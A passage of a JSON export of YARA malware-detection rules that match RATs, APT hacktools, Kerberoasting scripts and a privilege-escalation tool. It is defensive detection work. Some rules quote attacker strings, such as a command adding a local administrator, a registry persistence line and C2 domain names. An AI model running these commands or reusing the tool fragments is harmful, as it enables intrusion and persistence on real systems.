\"[WORKDATA]\" ascii\n      $s10 = \"address1\" ascii\n   condition: \n      uint32 ( 0 ) == 0x4d414e5b and $h1 at 0 and 8 of ( $s* ) and filesize < 5KB\n}","date":"2016-05-23 11:42:51","description":"Detects a config text file used by malware Cobra in RUAG case","minimum_yara":"1.7","name":"RUAG_Cobra_Config_File_RID2F1A","reference":"https://goo.gl/N5MEj0","required_modules":[],"rule_hash":"4329482e57a3cc6ac143559d5654ec5e","score":60,"tags":["APT","DEMO","FILE","NK"]},{"author":"Florian Roth","content":"rule RUAG_Exfil_Config_File_RID2F2B : APT DEMO FILE T1020 {\n   meta:\n      description = \"Detects a config text file used in data exfiltration in RUAG case\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/N5MEj0\"\n      date = \"2016-05-23 11:45:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"[TRANSPORT]\" ascii\n      $s1 = \"system_pipe\" ascii\n      $s2 = \"spstatus\" ascii\n      $s3 = \"adaptable\" ascii\n      $s4 = \"post_frag\" ascii\n      $s5 = \"pfsgrowperiod\" ascii\n   condition: \n      uint32 ( 0 ) == 0x4152545b and $h1 at 0 and all of ( $s* ) and filesize < 1KB\n}","date":"2016-05-23 11:45:41","description":"Detects a config text file used in data exfiltration in RUAG case","minimum_yara":"1.7","name":"RUAG_Exfil_Config_File_RID2F2B","reference":"https://goo.gl/N5MEj0","required_modules":[],"rule_hash":"718e926c8bfd7412ecb06d371ed85761","score":60,"tags":["APT","DEMO","FILE","T1020"]},{"author":"Florian Roth","content":"rule No_PowerShell_RID2C32 : DEMO EXE FILE HKTL SCRIPT T1086 {\n   meta:\n      description = \"Detects an C# executable used to circumvent PowerShell detection - file nps.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Ben0xA/nps\"\n      date = \"2016-05-21 09:38:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"nps.exe -encodedcommand {base64_encoded_command}\" fullword wide\n      $s2 = \"c:\\\\Development\\\\ghps\\\\nps\\\\nps\\\\obj\\\\x86\\\\Release\\\\nps.pdb\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $s* ) ) ) or ( all of them )\n}","date":"2016-05-21 09:38:51","description":"Detects an C# executable used to circumvent PowerShell detection - file nps.exe","minimum_yara":"1.7","name":"No_PowerShell_RID2C32","reference":"https://github.com/Ben0xA/nps","required_modules":[],"rule_hash":"7c5f8a8641ec50d3b18f5d1c8a26cf7c","score":80,"tags":["SCRIPT","DEMO","T1086","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule GetUserSPNs_VBS_RID2C7E : DEMO HKTL SCRIPT {\n   meta:\n      description = \"Semiautomatic generated rule - file GetUserSPNs.vbs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/skelsec/PyKerberoast\"\n      date = \"2016-05-21 09:51:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wscript.Echo \\\"User Logon: \\\" & oRecordset.Fields(\\\"samAccountName\\\")\" fullword ascii\n      $s2 = \"Wscript.Echo \\\" USAGE:        \\\" & WScript.ScriptName & \\\" SpnToFind [GC Servername or Forestname]\\\"\" fullword ascii\n      $s3 = \"strADOQuery = \\\"<\\\" + strGCPath + \\\">;(&(!objectClass=computer)(servicePrincipalName=*));\\\" & _\" fullword ascii\n   condition: \n      2 of them\n}","date":"2016-05-21 09:51:31","description":"Semiautomatic generated rule - file GetUserSPNs.vbs","minimum_yara":"1.7","name":"GetUserSPNs_VBS_RID2C7E","reference":"https://github.com/skelsec/PyKerberoast","required_modules":[],"rule_hash":"b5eb4f3fd7483db06432ed04d3865105","score":80,"tags":["DEMO","SCRIPT","HKTL"]},{"author":"Florian Roth","content":"rule GetUserSPNs_PS1_RID2C67 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file GetUserSPNs.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/skelsec/PyKerberoast\"\n      date = \"2016-05-21 09:47:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\" fullword ascii\n      $s2 = \"@{Name=\\\"PasswordLastSet\\\";      Expression={[datetime]::fromFileTime($result.Properties[\\\"pwdlastset\\\"][0])} } #, `\" fullword ascii\n      $s3 = \"Write-Host \\\"No Global Catalogs Found!\\\"\" fullword ascii\n      $s4 = \"$searcher.PropertiesToLoad.Add(\\\"pwdlastset\\\") | Out-Null\" fullword ascii\n   condition: \n      2 of them\n}","date":"2016-05-21 09:47:41","description":"Semiautomatic generated rule - file GetUserSPNs.ps1","minimum_yara":"1.7","name":"GetUserSPNs_PS1_RID2C67","reference":"https://github.com/skelsec/PyKerberoast","required_modules":[],"rule_hash":"321bc9b5da10324bdb1457a221db47ff","score":80,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule kerberoast_PY_RID2C4B : DEMO HKTL T1208 {\n   meta:\n      description = \"Semiautomatic generated rule - file kerberoast.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/skelsec/PyKerberoast\"\n      date = \"2016-05-21 09:43:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1208\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)\" fullword ascii\n      $s2 = \"key = kerberos.ntlmhash(args.password)\" fullword ascii\n      $s3 = \"help='the password used to decrypt/encrypt the ticket')\" fullword ascii\n      $s4 = \"newencserverticket = kerberos.encrypt(key, 2, e, nonce)\" fullword ascii\n   condition: \n      2 of them\n}","date":"2016-05-21 09:43:01","description":"Semiautomatic generated rule - file kerberoast.py","minimum_yara":"1.7","name":"kerberoast_PY_RID2C4B","reference":"https://github.com/skelsec/PyKerberoast","required_modules":[],"rule_hash":"db5cb8e44b835ce2cd3028bfa509a025","score":80,"tags":["DEMO","T1208","HKTL"]},{"author":"Florian Roth","content":"rule ONHAT_Proxy_Hacktool_RID2EA0 : APT CHINA DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Detects ONHAT Proxy - Htran like SOCKS hack tool used by Chinese APT groups\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/p32Ozf\"\n      date = \"2016-05-12 11:22:31\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"INVALID PARAMETERS. TYPE ONHAT.EXE -h FOR HELP INFORMATION.\" fullword ascii\n      $s2 = \"[ONHAT] LISTENS (S, %d.%d.%d.%d, %d) ERROR.\" fullword ascii\n      $s3 = \"[ONHAT] CONNECTS (T, %d.%d.%d.%d, %d.%d.%d.%d, %d) ERROR.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( 1 of ( $s* ) ) ) or ( 2 of them )\n}","date":"2016-05-12 11:22:31","description":"Detects ONHAT Proxy - Htran like SOCKS hack tool used by Chinese APT groups","minimum_yara":"1.7","name":"ONHAT_Proxy_Hacktool_RID2EA0","reference":"https://goo.gl/p32Ozf","required_modules":[],"rule_hash":"c72f98f56c4f3ccff76f40884458872c","score":100,"tags":["T1090","DEMO","FILE","T1020","APT","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule BeepService_Hacktool_RID2EF2 : APT CHINA DEMO EXE FILE HKTL T1035 T1077 {\n   meta:\n      description = \"Detects BeepService Hacktool used by Chinese APT groups\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/p32Ozf\"\n      date = \"2016-05-12 11:36:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, HKTL, T1035, T1077\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\%s\\\\admin$\\\\system32\\\\%s\" fullword ascii\n      $s1 = \"123.exe\" fullword ascii\n      $s2 = \"regclean.exe\" fullword ascii\n      $s3 = \"192.168.88.69\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $x1 and 1 of ( $s* )\n}","date":"2016-05-12 11:36:11","description":"Detects BeepService Hacktool used by Chinese APT groups","minimum_yara":"1.7","name":"BeepService_Hacktool_RID2EF2","reference":"https://goo.gl/p32Ozf","required_modules":[],"rule_hash":"eee10cf930f59c6d6c602cd8f5ead919","score":85,"tags":["T1077","T1035","DEMO","FILE","APT","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule GhostDragon_Gh0stRAT_RID2E7D : CHINA DEMO EXE FILE MAL T1112 {\n   meta:\n      description = \"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/the-ghost-dragon\"\n      date = \"2016-04-23 11:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1112\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"REG ADD HKEY_LOCAL_MACHINE\\\\%s /v ServiceDll /t REG_EXPAND_SZ /d \\\"%s\\\"\" fullword ascii\n      $x2 = \"Global\\\\REALCHEL_GLOBAL_SUBMIT_20031020_\" fullword ascii\n      $x3 = \"\\\\xclolg2.tmp\" fullword ascii\n      $x4 = \"Http/1.1 403 Forbidden\" fullword ascii\n      $x5 = \"%sxsd%d.pif\" fullword ascii\n      $x6 = \"%s\\\\%s32.dl_\" fullword ascii\n      $x7 = \"%-23s %-16s  0x%x(%02d)\" fullword ascii\n      $x8 = \"RegSetValueEx(start)\" fullword ascii\n      $x9 = \"%s\\\\%s64.dl_\" fullword ascii\n      $x10 = \"$#REGMASTERKEY$\u001fWebCat was successfully started\" fullword wide\n      $s1 = \"viewsc.dll\" fullword ascii\n      $s2 = \"Proxy-Connection:   Keep-Alive\" fullword ascii\n      $s3 = \"\\\\sfc_os.dll\" fullword ascii\n      $s4 = \"Mozilla/4.0 (compatible)\" fullword ascii\n      $s5 = \"Http/1.1 403 Forbidden\" fullword ascii\n      $s6 = \"CONNECT   %s:%d   HTTP/1.1\" fullword ascii\n      $s7 = \"WindowsUpperVersion\" fullword ascii\n      $s8 = \"[%d-%d-%d %d:%d:%d] (%s)\" fullword ascii\n      $s9 = \"SOFTWARE\\\\Microsoft\\\\DataAccess\\\\%s\" fullword ascii\n      $s10 = \"%s sp%d(%d)\" fullword ascii\n      $s11 = \"OpenSC ERROR \" fullword ascii\n      $s12 = \"get rgspath error \" fullword ascii\n      $s13 = \"Global\\\\GLOBAL_SUBMIT_0234_\" fullword ascii\n      $s14 = \"Global\\\\_vc_ck_ %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 6 of them )\n}","date":"2016-04-23 11:16:41","description":"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report","minimum_yara":"1.7","name":"GhostDragon_Gh0stRAT_RID2E7D","reference":"https://blog.cylance.com/the-ghost-dragon","required_modules":[],"rule_hash":"314f371321516f1a4f0eba20922edb81","score":75,"tags":["MAL","DEMO","T1112","FILE","CHINA","EXE"]},{"author":"Florian Roth","content":"rule GhostDragon_Gh0stRAT_Sample2_RID3170 : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/the-ghost-dragon\"\n      date = \"2016-04-23 13:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"AdobeWpk\" fullword ascii\n      $x2 = \"seekin.dll\" fullword ascii\n      $c1 = \"Windows NT 6.1; Trident/6.0)\" fullword ascii\n      $c2 = \"Mozilla/5.0 (compatible; MSIE 10.0; \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( all of ( $x* ) or all of ( $c* ) ) ) or ( all of them )\n}","date":"2016-04-23 13:22:31","description":"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report","minimum_yara":"1.7","name":"GhostDragon_Gh0stRAT_Sample2_RID3170","reference":"https://blog.cylance.com/the-ghost-dragon","required_modules":[],"rule_hash":"9cf2dd913485d70f62c64220dc18cdac","score":75,"tags":["DEMO","EXE","CHINA","FILE","MAL"]},{"author":"Florian Roth","content":"rule GhostDragon_Gh0stRAT_Sample3_RID3171 : CHINA DEMO MAL {\n   meta:\n      description = \"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.cylance.com/the-ghost-dragon\"\n      date = \"2016-04-23 13:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 44 24 15 65 88 54 24 16 c6 44 24 } \n      $op2 = { 44 24 1b 43 c6 44 24 1c 75 88 54 24 1e } \n      $op3 = { 1e 79 c6 44 24 1f 43 c6 44 24 20 75 88 54 24 22 } \n   condition: \n      all of them\n}","date":"2016-04-23 13:22:41","description":"Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report","minimum_yara":"1.7","name":"GhostDragon_Gh0stRAT_Sample3_RID3171","reference":"https://blog.cylance.com/the-ghost-dragon","required_modules":[],"rule_hash":"15649b30c246f9f3a0d035c9b02d3800","score":75,"tags":["DEMO","CHINA","MAL"]},{"author":"Florian Roth","content":"rule PoisonIvy_RAT_ssMUIDLL_RID2F13 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PoisonIvy RAT DLL mentioned in Palo Alto Blog in April 2016\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/WiwtYT\"\n      date = \"2016-04-22 11:41:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ssMUIDLL.dll\" fullword ascii\n      $op1 = { 6a 00 c6 07 e9 ff d6 } \n      $op2 = { 02 cb 6a 00 88 0f ff d6 47 ff 4d fc 75 } \n      $op3 = { 6a 00 88 7f 02 ff d6 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( all of ( $op* ) ) ) or ( all of them )\n}","date":"2016-04-22 11:41:41","description":"Detects PoisonIvy RAT DLL mentioned in Palo Alto Blog in April 2016","minimum_yara":"1.7","name":"PoisonIvy_RAT_ssMUIDLL_RID2F13","reference":"http://goo.gl/WiwtYT","required_modules":[],"rule_hash":"a5639d3f4a75db637e71ed863d3b265d","score":85,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Nanocore_RAT_Gen_1_RID2D95 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detetcs the Nanocore RAT and similar malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 10:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Logintech\\\\Dropbox\\\\Projects\\\\New folder\\\\Latest\\\\Benchmark\\\\Benchmark\\\\obj\\\\Release\\\\Benchmark.pdb\" fullword ascii\n      $x2 = \"RunPE1\" fullword ascii\n      $x3 = \"082B8C7D3F9105DC66A7E3267C9750CF43E9D325\" fullword ascii\n      $x4 = \"$374e0775-e893-4e72-806c-a8d880a49ae7\" fullword ascii\n      $x5 = \"Monitorinjection\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )\n}","date":"2016-04-22 10:38:01","description":"Detetcs the Nanocore RAT and similar malware","minimum_yara":"1.7","name":"Nanocore_RAT_Gen_1_RID2D95","reference":"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/","required_modules":[],"rule_hash":"1d44bd69611502109445fdb9cccc8efb","score":70,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule Nanocore_RAT_Gen_2_RID2D96 : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detetcs the Nanocore RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 10:38:11\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"NanoCore.ClientPluginHost\" fullword ascii\n      $x2 = \"IClientNetworkHost\" fullword ascii\n      $x3 = \"#=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them ) or ( all of them )\n}","date":"2016-04-22 10:38:11","description":"Detetcs the Nanocore RAT","minimum_yara":"1.7","name":"Nanocore_RAT_Gen_2_RID2D96","reference":"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/","required_modules":[],"rule_hash":"8b5b2a28922b321f712b16b015e7ddcc","score":100,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule Nanocore_RAT_Sample_1_RID2EDD : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detetcs a certain Nanocore RAT sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 11:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK\" fullword wide\n      $x2 = \"1EF0D55861681D4D208EC3070B720C21D885CB35\" fullword ascii\n      $x3 = \"popthatkitty.Resources.resources\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) ) ) or ( all of them )\n}","date":"2016-04-22 11:32:41","description":"Detetcs a certain Nanocore RAT sample","minimum_yara":"1.7","name":"Nanocore_RAT_Sample_1_RID2EDD","reference":"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/","required_modules":[],"rule_hash":"270c2c31cd35fd6398cd09e2dabbc237","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Nanocore_RAT_Sample_2_RID2EDE : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detetcs a certain Nanocore RAT sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n      date = \"2016-04-22 11:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"U4tSOtmpM\" fullword ascii\n      $s2 = \")U71UDAU_QU_YU_aU_iU_qU_yU_\" fullword wide\n      $s3 = \"Cy4tOtTmpMtTHVFOrR\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of ( $s* )\n}","date":"2016-04-22 11:32:51","description":"Detetcs a certain Nanocore RAT sample","minimum_yara":"1.7","name":"Nanocore_RAT_Sample_2_RID2EDE","reference":"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/","required_modules":[],"rule_hash":"62a7f1be90637b5b379c15b38bb89b52","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Metasploit_Loader_RSMudge_RID30DF : DEMO EXE FILE METASPLOIT SUSP {\n   meta:\n      description = \"Detects a Metasploit Loader by RSMudge - file loader.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/rsmudge/metasploit-loader\"\n      date = \"2016-04-20 12:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, METASPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Could not resolve target\" fullword ascii\n      $s2 = \"Could not connect to target\" fullword ascii\n      $s3 = \"%s [host] [port]\" fullword ascii\n      $s4 = \"ws2_32.dll is out of date.\" fullword ascii\n      $s5 = \"read a strange or incomplete length value\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 3 of ( $s* ) ) ) or ( all of them )\n}","date":"2016-04-20 12:58:21","description":"Detects a Metasploit Loader by RSMudge - file loader.exe","minimum_yara":"1.7","name":"Metasploit_Loader_RSMudge_RID30DF","reference":"https://github.com/rsmudge/metasploit-loader","required_modules":[],"rule_hash":"7fd97b5f0691841e958b7c484768cad5","score":75,"tags":["SUSP","DEMO","EXE","METASPLOIT","FILE"]},{"author":"Florian Roth","content":"rule APT6_Malware_Sample_Gen_RID2F8E : APT DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Rule written for 2 malware samples that communicated to APT6 C2 servers\"\n      author = \"Florian Roth\"\n      reference = \"https://otx.alienvault.com/pulse/56c4d1664637f26ad04e5b73/\"\n      date = \"2016-04-09 12:02:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"file\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"SPCK!it is a [(?riddle?) wrapped in a {mystery}] inside an <enigma>!\" fullword ascii\n      $x3 = \"636C7369643A46334430443336462D323346382D343638322D413139352D373443393242303344344146\" fullword ascii\n      $s1 = \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\" fullword ascii\n      $s2 = \"DUMPTHIN\" fullword ascii\n      $s3 = \"\\\"C:\\\\WINDOWS\\\\system32\\\\\" fullword ascii\n      $s4 = \"window.eval(f.decodeURIComponent(a));\" fullword ascii\n      $s5 = \"/tbedrs.dll\" fullword ascii\n      $s6 = \"NSISDL/1.2 (Mozilla)\" fullword ascii\n      $s7 = \"NSIS_Inetc (Mozilla)\" fullword ascii\n      $s8 = \"/logos.gif\" fullword ascii\n      $s9 = \"synflood\" fullword ascii\n      $s10 = \"IconFile=C:\\\\WINDOWS\\\\system32\\\\SHELL32.dll\" fullword ascii\n      $s11 = \"udpflood\" fullword ascii\n      $s12 = \"shellcode\" fullword ascii\n      $s13 = \"&PassWord=\" fullword ascii\n      $s14 = \"SystemPropertiesProtection.exe\" fullword ascii\n      $s15 = \"SystemPropertiesRemote.exe\" fullword ascii\n      $c1 = \"jobcall.org\" ascii\n      $c2 = \"sportsinfinite.com\" ascii\n      $c3 = \"milsatcom.us\" ascii\n      $c4 = \"geographicphotographer.com\" ascii\n      $c5 = \"snowsmooth.com\" ascii\n      $c6 = \"goodre.net\" ascii\n      $c7 = \"gloflabs.com\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( 1 of ( $x* ) and 3 of ( $s* ) ) or 1 of ( $c* ) ) ) or ( 6 of them )\n}","date":"2016-04-09 12:02:11","description":"Rule written for 2 malware samples that communicated to APT6 C2 servers","minimum_yara":"1.7","name":"APT6_Malware_Sample_Gen_RID2F8E","reference":"https://otx.alienvault.com/pulse/56c4d1664637f26ad04e5b73/","required_modules":[],"rule_hash":"a0fb19cb9984d92bc59db250ce6ed255","score":80,"tags":["MAL","DEMO","FILE","APT","GEN","EXE"]},{"author":"Florian Roth","content":"rule Linux_Portscan_Shark_1_RID2FB2 : DEMO FILE HKTL LINUX T1046 {\n   meta:\n      description = \"Detects Linux Port Scanner Shark\"\n      author = \"Florian Roth\"\n      reference = \"Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35\"\n      date = \"2016-04-01 12:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL, LINUX, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rm -rf scan.log session.txt\" fullword ascii\n      $s17 = \"*** buffer overflow detected ***: %s terminated\" fullword ascii\n      $s18 = \"*** stack smashing detected ***: %s terminated\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7362 and all of them )\n}","date":"2016-04-01 12:08:11","description":"Detects Linux Port Scanner Shark","minimum_yara":"1.7","name":"Linux_Portscan_Shark_1_RID2FB2","reference":"Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35","required_modules":[],"rule_hash":"29d6a12c0f9f85963c4e16e93176304b","score":75,"tags":["DEMO","LINUX","T1046","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Linux_Portscan_Shark_2_RID2FB3 : DEMO HKTL LINUX T1046 {\n   meta:\n      description = \"Detects Linux Port Scanner Shark\"\n      author = \"Florian Roth\"\n      reference = \"Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35\"\n      date = \"2016-04-01 12:08:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, LINUX, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>\" fullword ascii\n      $s2 = \"Difference between server modulus and host modulus is only %d. It's illegal and may not work\" fullword ascii\n      $s3 = \"rm -rf scan.log\" fullword ascii\n   condition: \n      all of them\n}","date":"2016-04-01 12:08:21","description":"Detects Linux Port Scanner Shark","minimum_yara":"1.7","name":"Linux_Portscan_Shark_2_RID2FB3","reference":"Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35","required_modules":[],"rule_hash":"81d8156f2c9c785c8ab94ed5ec81404e","score":75,"tags":["DEMO","LINUX","T1046","HKTL"]},{"author":"Florian Roth","content":"rule TempRacer_RID2A94 : DEMO EXE FILE HKTL T1068 T1087 {\n   meta:\n      description = \"Detects privilege escalation tool - file TempRacer_RID2A94.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.darknet.org.uk/2016/03/tempracer-windows-privilege-escalation-tool/\"\n      date = \"2016-03-30 06:58:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1068, T1087\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\obj\\\\Release\\\\TempRacer_RID2A94.pdb\" ascii\n      $s2 = \"[+] Injecting into \" fullword wide\n      $s3 = \"net localgroup administrators alex /add\" fullword wide\n      $s4 = \"[+] File: {0} renamed to {1}\" fullword wide\n      $s5 = \"[+] Blocking \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 25KB and 1 of them ) or ( 4 of them )\n}","date":"2016-03-30 06:58:21","description":"Detects privilege escalation tool - file TempRacer.exe","minimum_yara":"1.7","name":"TempRacer_RID2A94","reference":"http://www.darknet.org.uk/2016/03/tempracer-windows-privilege-escalation-tool/","required_modules":[],"rule_hash":"444fc985676383a5c230ddbd371478a0","score":75,"tags":["T1068","T1087","DEMO","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule FourElementSword_ResN32DLL_RID309E : DEMO MAL {\n   meta:\n      description = \"Detects FourElementSword Malware - file bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f\"\n      author = \"Florian Roth\"\n      reference = 